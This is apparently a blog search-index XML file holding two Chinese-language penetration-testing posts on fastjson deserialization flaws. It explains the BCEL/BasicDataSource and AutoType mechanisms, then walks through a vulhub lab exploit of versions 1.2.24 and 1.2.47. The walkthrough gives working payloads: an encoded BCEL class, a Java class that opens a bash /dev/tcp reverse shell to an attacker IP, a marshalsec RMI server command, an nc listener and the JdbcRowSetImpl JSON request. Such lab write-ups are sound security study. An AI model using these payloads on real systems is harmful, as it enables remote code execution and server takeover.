<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>fastjson漏洞不出网利用</title>
    <url>/stcs/2023/07/5dfcbb92c2c0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在进入主题前，先分析一下fastjson公开的三条利用链：</p>
<ol>
<li><p>JNDI(JdbcRowSetImpl)</p>
<ul>
<li>攻击类：<code>com.sun.rowset.JdbcRowSetImpl</code></li>
<li>优点：实战可以利用，JDNI注入基于较低版本的JDK，LDAP适用范围更广</li>
<li>缺点：必须出网加载远程的恶意字节码，有一定的局限性</li>
</ul>
</li>
<li><p>TemplateImpl</p>
<ul>
<li>攻击类：<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></li>
<li>优点：TemplatesImpl类是Java反序列化界比较常用的类，更容易理解和上手</li>
<li>缺点：需要开启<code>Feature.SupportNonPublicField</code>，实战中不适用</li>
</ul>
</li>
<li><p>BasicDataSource</p>
<ul>
<li><p>攻击类：</p>
<ul>
<li><p>tomcat8或以上：<code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</code></p>
</li>
<li><p>tomcat8以下：<code>org.apache.tomcat.dbcp.dbcp.BasicDataSource</code></p>
</li>
</ul>
</li>
<li><p>优点：不需要出网，不需要开启特殊的参数，适用范围较广</p>
</li>
<li><p>缺点：需要有tomcat的依赖</p>
</li>
</ul>
</li>
</ol>
<h1 id="什么是BCEL"><a href="#什么是BCEL" class="headerlink" title="什么是BCEL"></a>什么是BCEL</h1><p>BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，BCEL库提供了一系列用于分析、创建、修改Java Class文件的API.</p>
<p>这里不做过多解释，具体介绍请参考文章：<a href="https://blog.csdn.net/evasnowind/article/details/100727903">https://blog.csdn.net/evasnowind/article/details/100727903</a></p>
<h1 id="BCEL使用"><a href="#BCEL使用" class="headerlink" title="BCEL使用"></a>BCEL使用</h1><p>BCEL这个包中有个ClassLoder的类，它重写了Java内置的<code>ClassLoader#loadClass()</code>方法。 在<code>ClassLoader#loadClass()</code>中，会判断类名是否是<code>$$BCEL$$</code>开头，如果是的话，将会对这个字符串进行解码。可以理解为是传统字节码的HEX编码，再将反斜线替换成<code>$</code>。默认情况下外层还会加一层GZip压缩。</p>
<p>我们可以构造以下的代码来初步使用和体验BCEL：</p>
<div class="tabs"><div class="nav-tabs"><button type="button" class="tab active">Eval.java</button><button type="button" class="tab">Main.java</button></div><div class="tab-contents"><div class="tab-item-content active"><p>编写一个执行命令的类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Eval</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content"><p>这里使用BCEL提供的<code>Repository</code>类将一个JavaClass先转换成字节码(编译)，再使用<code>Utility</code>类将原生的字节码转换成BCEL字节码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(Eval.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">encodeStr</span> <span class="operator">=</span> Utility.encode(javaClass.getBytes(), <span class="literal">true</span>);</span><br><span class="line">        System.out.println(encodeStr);</span><br><span class="line">        Class.forName(<span class="string">&quot;$$BCEL$$&quot;</span> + encodeStr, <span class="literal">true</span>, <span class="keyword">new</span> <span class="title class_">ClassLoader</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div>

<p>运行后，会正常执行Eval类的代码。</p>
<p><img src="image-20230719201958847.png" alt="image-20230719201958847"></p>
<h1 id="fastjson漏洞利用"><a href="#fastjson漏洞利用" class="headerlink" title="fastjson漏洞利用"></a>fastjson漏洞利用</h1><p>看到这里可能会有疑问：上面说了这么多BCEL，那和BasicDataSource有什么关系呢？其实是有的，在分析代码之前，先在代码中导入tomcat的依赖，因为BasicDataSource是依赖于tomcat的。先导入maven的依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-dbcp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.36<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;payload\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;driverClassName\&quot;: \&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$C1$U$3d$85$91a$c6Ae$f0$fdf$r$b8$90$8d$3b$8c$h$83$h$c7G$c4$e8$ba$d4$G$ab$c3$8c$Z$K$e1$8f$5c$b3Q$e3$c2$P$f0$a3$8c$b7$95$a8$89Mzo$eey$dd$a6$l$9fo$ef$A$f6Q$f5$e1b$de$c7$C$W$8bX2$7d$d9$c5$8a$8bU$Xk$M$85$D$95$u$7d$c8$90$af$d5$af$Z$9c$a3$f4V2$ccF$w$91g$83$5eGfW$bc$T$T$SF$a9$e0$f15$cf$94$99$t$a0$a3$efT$9f2$a2$d6$90$c7M$86$e2$81$88$tq$a5$b6$e6$e2$e1$94$3fZ$v$zd$f0$db$e9$m$T$f2X$Z$abg$y$7b$f7$7c$c8$D$U$e1$b9X$P$b0$81M$ca$a45$o$c0$W$b6$Z$w$86o$c4$3c$e96Z$p$n$l$b5J$TR$Y$x$c3$dc$_y$de$b9$97B3$94$7f$a1$cbA$a2U$8f$W$f9$5d$a9$7f$86$85Z$3d$fa$a7$a1$87$3br$q$F$c3N$ed$P$db$d6$99J$ba$cd$bf$86$8b$y$V$b2$dfo$a2$8a$C$7d$aa990$f3$7e$aa$3eM$N$ea$8c$fa$d4$ee$L$d8$d8$d2$d3T$L$W$cc$n$a0$g$7c$LP$c2$M$f5$of$7f$cc$e76$M$98yE$$$cc$3f$c3$b9y$82s2$b6$98G$be$v$e4mZ$I$c7$sx$e4$O$u$bbdY$93$P$cc$d1u$91$8b$5c$94A$c6$d0$c2$95$_$5c$bcr$b3$M$C$A$A\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;: \&quot;key\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在上面的代码中的<code>driverClassName</code>字段，就是使用BCEL转换后的字节码</p>
<p>执行结果如下图：</p>
<p><img src="image-20230719204420503.png" alt="image-20230719204420503"></p>
<p>因作者代码审计能力过于薄弱，具体的代码分析可以参考文章：<a href="https://www.anquanke.com/post/id/248892#h2-1">https://www.anquanke.com/post/id/248892#h2-1</a></p>
<h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>文章参考：</p>
<blockquote>
<p><a href="https://www.anquanke.com/post/id/248892#h2-1">https://www.anquanke.com/post/id/248892#h2-1</a></p>
<p><a href="https://www.cnblogs.com/R0ser1/p/15918626.html">https://www.cnblogs.com/R0ser1/p/15918626.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>stcs</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>红队</tag>
        <tag>fastjson</tag>
        <tag>Java漏洞</tag>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson反序列化漏洞</title>
    <url>/stcs/2023/07/e08e901851f2/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="什么是fastjson"><a href="#什么是fastjson" class="headerlink" title="什么是fastjson"></a>什么是fastjson</h2><mark class="hl-label blue">fastjson</mark>是一个由阿里开发的开源Java类库，可以将Java对象转换为JSON格式；当然，它也可以将JSON字符串转换为Java对象。fastjson可以操作任何Java对象，即使是一些预先存在的没有源码的对象，fastjson也可以进行操作。所以它的使用是很广泛的。

<h2 id="什么是序列化和反序列化"><a href="#什么是序列化和反序列化" class="headerlink" title="什么是序列化和反序列化"></a>什么是序列化和反序列化</h2><p>序列化就是将一个对象转换成JSON字符串的过程，而反序列化就是将JSON字符串转换成对象的过程。</p>
<h1 id="AutoType"><a href="#AutoType" class="headerlink" title="AutoType"></a>AutoType</h1><p>在进行漏洞复现之前，先来了解一下fastjson的<mark class="hl-label blue">AutoType</mark>的机制</p>
<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>fastjson引入了<mark class="hl-label blue">@AutoType</mark>的注解，fastjson在读取json字符串并进行反序列化操作时，会读取到json字符串中的<mark class="hl-label blue">@type</mark>的内容，将json字符串的内容反序列化为Java对象并调用这个对象所属类的setter方法。</p>
<blockquote>
<p>当然，漏洞产生的原因也是因为这个AutoType的功能。</p>
</blockquote>
<h2 id="使用原因"><a href="#使用原因" class="headerlink" title="使用原因"></a>使用原因</h2><p>既然上文都说了漏洞产生的原因也是在这个AutoType的功能上产生的，那为什么还要使用呢？</p>
<p>其实fastjson在进行转换的过程中并没有使用Java自带的序列化机制，而是自定义了一套机制。对于JSON框架来说，想要把一个Java对象转换成字符串。可以使用下面两种方法进行转换：</p>
<ol>
<li>基于<code>getter</code>和<code>setter</code></li>
<li>AutoType</li>
</ol>
<h3 id="基于getter和setter"><a href="#基于getter和setter" class="headerlink" title="基于getter和setter"></a>基于<code>getter</code>和<code>setter</code></h3><p>基于<code>getter</code>和<code>setter</code>来进行序列化和反序列化操作时，当转换后得到对象的类只有一个接口的时候，将这个类的对象进行反序列化操作的时候，就会将子类抹去，只保留接口的类型，最后导致反序列化时无法得到原始类型。示例代码如下：</p>
<div class="tabs"><div class="nav-tabs"><button type="button" class="tab active">store.java</button><button type="button" class="tab">main.java</button></div><div class="tab-contents"><div class="tab-item-content active"><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.math.BigDecimal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Store</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Phone phone;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Phone <span class="title function_">getPhone</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPhone</span><span class="params">(Phone phone)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.phone = phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Store&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, phone=&quot;</span> + phone +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 手机的接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Phone</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Apple</span> <span class="keyword">implements</span> <span class="title class_">Phone</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> BigDecimal price;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> BigDecimal <span class="title function_">getPrice</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPrice</span><span class="params">(BigDecimal price)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Apple&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;price=&quot;</span> + price +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content"><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.math.BigDecimal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        商店类</span></span><br><span class="line">        <span class="type">Store</span> <span class="variable">store</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Store</span>();</span><br><span class="line">        store.setName(<span class="string">&quot;落星辰&quot;</span>);</span><br><span class="line"><span class="comment">//        苹果手机价格</span></span><br><span class="line">        <span class="type">Apple</span> <span class="variable">apple</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Apple</span>();</span><br><span class="line">        apple.setPrice(<span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="number">12000</span>));</span><br><span class="line"><span class="comment">//        将苹果手机放入商店</span></span><br><span class="line">        store.setPhone(apple);</span><br><span class="line"><span class="comment">//        序列化操作</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> JSON.toJSONString(store);</span><br><span class="line">        System.out.println(<span class="string">&quot;-----现在执行序列化操作-----&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化：&quot;</span> + s);</span><br><span class="line">        System.out.println(<span class="string">&quot;---------------------------\n\n\n&quot;</span>);</span><br><span class="line"><span class="comment">//        反序列化操作</span></span><br><span class="line">        <span class="type">Store</span> <span class="variable">ns</span> <span class="operator">=</span> JSON.parseObject(s, Store.class);</span><br><span class="line">        System.out.println(<span class="string">&quot;-----现在执行反序列化操作-----&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化：&quot;</span> + ns);</span><br><span class="line">        <span class="type">Apple</span> <span class="variable">a</span> <span class="operator">=</span> (Apple) ns.getPhone();</span><br><span class="line">        System.out.println(<span class="string">&quot;获取苹果手机： &quot;</span> + a);</span><br><span class="line">        System.out.println(<span class="string">&quot;---------------------------&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div>

<p>代码执行结果如下：</p>
<p><img src="image-20230709162454451.png" alt="image-20230709162454451"></p>
<p>通过运行结果我们可以得出：在进行反序列化操作后，我们尝试将Phone类型转换为Apple类型，但是抛出了异常，而转换成Phone却不会抛出异常：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Phone</span> <span class="variable">a</span> <span class="operator">=</span> (Phone) ns.getPhone();</span><br><span class="line">System.out.println(<span class="string">&quot;获取苹果手机： &quot;</span> + a);</span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<p><img src="image-20230709163301530.png" alt="image-20230709163301530"></p>
<h3 id="使用AutoType"><a href="#使用AutoType" class="headerlink" title="使用AutoType"></a>使用AutoType</h3><p>为了解决上面的问题，fastjson引入了AdutoType的功能，它会在序列化的时候，把原始类型记录下来。</p>
<p>我们只需要将上面代码中序列化的操作加上参数<code>SerializerFeature.WriteClassName</code>，它会把原始类型标记下来。下面是修改代码前后比对：</p>
<div class="tabs"><div class="nav-tabs"><button type="button" class="tab active">修改前</button><button type="button" class="tab">修改后</button></div><div class="tab-contents"><div class="tab-item-content active"><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> JSON.toJSONString(store);</span><br></pre></td></tr></table></figure></div><div class="tab-item-content"><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> JSON.toJSONString(store, SerializerFeature.WriteClassName);</span><br></pre></td></tr></table></figure></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div>

<p>修改之后的运行结果如下：</p>
<p><img src="image-20230709164210557.png" alt="image-20230709164210557"></p>
<p>我们可以看到，输出序列化的JSON字符串的时候，多了一个<code>@type</code>的字段，标记了类对应的原始类型，这样方便了在反序列化的时候定位到具体类型。</p>
<blockquote>
<p>这就是AutoType的功能，以及fastjson中使用AutoType的原因。</p>
</blockquote>
<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>因为有了autoType功能，那么fastjson在对JSON字符串进行反序列化的时候，就会读取<code>@type</code>到内容，试图把JSON内容反序列化成这个对象，并且会调用这个类的setter方法。</p>
<p>因为AutoType在设计之初时，安全方面考虑不周全，我们就可以利用这个特性，去构造一个JSON字符串，并使用<code>@type</code>指定一个自己想要攻击的类库。</p>
<p>最常见的就有sun官方提供过的一个<code>com.sun.rowset.JdbcRowSetImpl</code>这个类，这个类中有个dataSourceName方法支持传入一个<a href="!--swig%EF%BF%BC22--">rmi</a>的源，只要解析其中的url就会支持远程调用。</p>
<p>那么整个漏洞的利用过程就是：</p>
<p><img src="image-20230713194942849.png" alt="image-20230713194942849"></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><blockquote>
<p>trip: 如何判断是否使用的组件是fastjson可以参考文章：</p>
<p><a href="https://blog.csdn.net/qq_18980147/article/details/126653516">https://blog.csdn.net/qq_18980147/article/details/126653516</a></p>
</blockquote>
<h2 id="1-2-24版本"><a href="#1-2-24版本" class="headerlink" title="1.2.24版本"></a>1.2.24版本</h2><h3 id="开启靶机"><a href="#开启靶机" class="headerlink" title="开启靶机"></a>开启靶机</h3><p>靶场使用vulhub搭建，进入fastjson漏洞的目录</p>
<p><img src="image-20230709183614815.png" alt="image-20230709183614815"></p>
<p>执行命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>执行成功后输入下面命令查看靶机是否启动</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>

<p>如果看到下图信息即开启成功</p>
<p><img src="image-20230709183811800.png" alt="image-20230709183811800"></p>
<p>启动成功后访问<code>http://你靶机的ip:8090</code>即可访问靶机页面</p>
<p><img src="image-20230709184308892.png" alt="image-20230709184308892"></p>
<h3 id="搭建执行恶意命令的服务器"><a href="#搭建执行恶意命令的服务器" class="headerlink" title="搭建执行恶意命令的服务器"></a>搭建执行恶意命令的服务器</h3><blockquote>
<p>在搭建服务器前，得先搭建Java,maven和rmi服务的环境。搭建文章如下：</p>
<p>搭建Java环境：</p>
<p><a href="https://blog.csdn.net/qq_45009837/article/details/126055165">https://blog.csdn.net/qq_45009837/article/details/126055165</a></p>
<p>搭建maven环境：</p>
<p><a href="https://blog.csdn.net/qq_45867375/article/details/124730372">https://blog.csdn.net/qq_45867375/article/details/124730372</a></p>
<p>搭建rmi服务：</p>
<p><a href="https://blog.csdn.net/m0_54899775/article/details/122485232">https://blog.csdn.net/m0_54899775/article/details/122485232</a></p>
</blockquote>
<p>搭建步骤如下：</p>
<div class="tabs"><div class="nav-tabs"><button type="button" class="tab active">step1</button><button type="button" class="tab">step2</button><button type="button" class="tab">step3</button><button type="button" class="tab">step4</button></div><div class="tab-contents"><div class="tab-item-content active"><p>编写一个恶意类，代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line"><span class="comment">//            获取runtime对象</span></span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.74.130/7178 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> r.exec(commands);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>编写完成后，使用javac进行编译：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">javac Shell.java</span><br></pre></td></tr></table></figure>

<p>编译完成后，目录内容是这样的：</p>
<p><img src="image-20230712115005969.png" alt="image-20230712115005969"></p></div><div class="tab-item-content"><p>使用python启动web服务，执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 4433</span><br></pre></td></tr></table></figure>

<p>执行成功后结果如下：</p>
<p><img src="image-20230712115341348.png" alt="image-20230712115341348"></p>
<p>访问页面如下：</p>
<p><img src="image-20230712115403446.png" alt="image-20230712115403446"></p></div><div class="tab-item-content"><p>启动http服务之后，启动rmi服务器</p>
<p>在marshalsec的目录下执行如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://192.168.74.130:4433/#Shell&quot;</span> 9999</span><br></pre></td></tr></table></figure>



<blockquote>
<p>注意：引号那里是根据你开启的http服务器的IP和构造的恶意类决定的。例如你开启HTTP服务的IP是192.168.3.39，端口是6677，构造的恶意类的类名是AABB，那么你的RMI执行远程代码的地址就是：<code>http://192.168.3.39:6677/#AABB</code></p>
</blockquote>
<p>执行完成后显示如下信息即表示开启成功：</p>
<p><img src="image-20230712120233757.png" alt="image-20230712120233757"></p></div><div class="tab-item-content"><p>在你代码中反弹shell的那个IP对应的电脑上输入如下命令来监听端口：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 7178</span><br></pre></td></tr></table></figure>

<p>执行成功后会显示如下信息：</p>
<p><img src="image-20230712120416565.png" alt="image-20230712120416565"></p></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div>



<h3 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h3><p>刷新靶机页面<code>http://你靶机的ip:8090</code>并用burp抓包，将数据包进行修改：</p>
<ul>
<li>将请求方法改成POST</li>
<li>添加如下json数据：</li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">Content-Type<span class="punctuation">:</span> application/json</span><br><span class="line">Content-Length<span class="punctuation">:</span> <span class="number">168</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://192.168.74.130:9999/Shell&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"> </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：rmi的地址改成部署的rmi的IP和端口</p>
</blockquote>
<p>响应结果如下：</p>
<div class="tabs"><div class="nav-tabs"><button type="button" class="tab active">rmi日志</button><button type="button" class="tab">http日志</button><button type="button" class="tab">nc监听</button></div><div class="tab-contents"><div class="tab-item-content active"><p><img src="image-20230713175230686.png" alt="image-20230713175230686"></p></div><div class="tab-item-content"><p><img src="image-20230713175450748.png" alt="image-20230713175450748"></p></div><div class="tab-item-content"><p><img src="image-20230713175517054.png" alt="image-20230713175517054"></p></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div>

<p>可以看到，已经拿到目标服务器的shell了。</p>
<h2 id="1-2-47版本"><a href="#1-2-47版本" class="headerlink" title="1.2.47版本"></a>1.2.47版本</h2><p>步骤还是一样的，只不过靶机的目录不一样了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> vulhub/fastjson/1.2.47-rce/</span><br></pre></td></tr></table></figure>

<p><img src="image-20230713180615788.png" alt="image-20230713180615788"></p>
<p>进入目录之后执行命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

